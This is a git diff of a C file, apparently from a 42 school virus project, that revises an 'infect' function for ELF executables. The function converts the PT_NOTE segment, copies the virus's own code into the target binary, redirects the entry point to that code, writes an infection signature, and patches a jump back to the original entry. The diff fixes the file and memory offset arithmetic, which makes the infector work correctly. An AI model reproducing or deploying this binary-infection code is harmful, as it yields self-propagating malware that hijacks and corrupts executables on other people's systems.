@@ -6,7 +6,7 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/20 11:54:10 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/21 13:56:49 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -48,7 +48,7 @@ bool	infect(profiling *this, const str path) {
 		return true;
 	}
 
-	data.mmap_size = file_stat.st_size;
+	data.original_size = file_stat.st_size;
 	data.fd = fd;
 
 	// Logic starts
@@ -60,23 +60,21 @@ bool	infect(profiling *this, const str path) {
 	//	Change the PT_NOTE segment
 	change_note_segment(this, &data);
 
+	print_data(&data);
 	//	Copy the code
-	ft_memcpy(data.file + data.infection_offset, this->start_rip, this->size);
+	ft_memcpy(data.file + data.infection_offset_file, this->start_rip, this->size);
 	
 	//	Change the entrypoint
-	data.elf->e_entry = data.infection_offset + 0x1000;
+	data.elf->e_entry = data.infection_offset_mem;
 	
 	//	Copy signature
-	ft_memcpy(data.file + data.infection_offset + this->size + SIGNATURE_OFFSET, this->signature, SIGNATURE_LEN);
-	printf("Written %s at 0x%lx\n", data.file + data.infection_offset + this->size + SIGNATURE_OFFSET,
-		data.infection_offset + this->size + SIGNATURE_OFFSET);
+	ft_memcpy(data.file + data.infection_offset_file + this->size + SIGNATURE_OFFSET, this->signature, SIGNATURE_LEN);
+	printf("Written %s at 0x%lx\n", data.file + data.infection_offset_file + this->size + SIGNATURE_OFFSET,
+		data.infection_offset_file + this->size + SIGNATURE_OFFSET);
 
-	int	new_jump = 0 - (data.infection_offset + this->size) + data.original_entry_point + 12 - 0x1000;
+	int	new_jump = 0 - (data.infection_offset_mem + this->size) + data.original_entry_point_mem + 12;
 
-
-	write(ret, 1, &new_jump, 4);
-	ft_memcpy(data.file + data.infection_offset + this->size - 16, (byte *)&new_jump, 4);
-	write(ret, 1, data.file + data.infection_offset + this->size - 16, 4);
+	ft_memcpy(data.file + data.infection_offset_file + this->size - 16, (byte *)&new_jump, 4);
 
 	// Logic ends
 	infect_end:
@@ -107,7 +105,7 @@ static bool	parsing(byte *file, elf_data *data) {
 	data->elf = (Elf64_Ehdr *)file;
 	data->sections = (Elf64_Shdr *)(file + data->elf->e_shoff);
 	data->segments = (Elf64_Phdr *)(file + data->elf->e_phoff);
-	data->original_entry_point = data->elf->e_entry;
+	data->original_entry_point_mem = data->elf->e_entry;
 
 	for (size_t i = 0; i < data->elf->e_phnum; i++) {
 		seg = &data->segments[i];
